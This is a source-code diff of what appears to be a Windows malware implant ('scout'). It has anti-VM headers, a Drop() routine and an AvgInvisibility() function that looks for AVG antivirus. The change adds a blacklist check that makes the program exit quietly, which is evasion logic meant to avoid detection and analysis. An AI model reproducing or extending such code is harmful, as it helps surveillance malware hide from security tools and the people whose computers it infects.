@@ -17,6 +17,7 @@
 #include "antivm.h"
 #include "zmem.h"
 #include "utils.h"
+#include "blacklist.h"
 
 #define _GLOBAL_VERSION_FUNCTIONS_ //defines the exported function and the GetSharedMemoryName funcion
 #include "version.h"
@@ -31,6 +32,7 @@
 
 extern VOID SyncThreadFunction();
 extern PWCHAR GetRandomString(ULONG uMin);
+
 //extern BYTE pServerKey[32];
 //extern BYTE pConfKey[32];
 //extern BYTE pSessionKey[20];
@@ -165,6 +167,11 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 
 	MySleep(WAIT_DROP/2);	
 
+	//check blacklist
+	if(!BL_CheckList())
+		return 0;	
+
+
 	//la CoInitializeEx restituisce un errore se utilizzata nella main e le successiva chiamata della CoInitialize,
 	//nella GetDeviceInfo() e BitTransfer non andavanp a buon fine. Funzioni spostate all'interno della funzione SyncThreadFunction
 	//HRESULT hRet = CoInitializeEx(0, COINIT_MULTITHREADED);
@@ -190,6 +197,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	{
 		Drop();
 		MySleep(1000);
+		
 		AvgInvisibility();
 	}
 
@@ -837,6 +845,10 @@ LPWSTR CreateTempFile()
 	return pShortTempFileName;
 }
 
+
+
+
+
 VOID AvgInvisibility()
 {
 
@@ -877,7 +889,7 @@ VOID AvgInvisibility()
 		OutputDebugString(L"64bit");
 #endif
 
-		if (StrStrI(pApplicationList, szAvg)) 
+		if (StrStrI(pApplicationList, szAvg))
 		{
 			HANDLE hScout = CreateFile(strDestPath, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 			if(hScout == INVALID_HANDLE_VALUE)
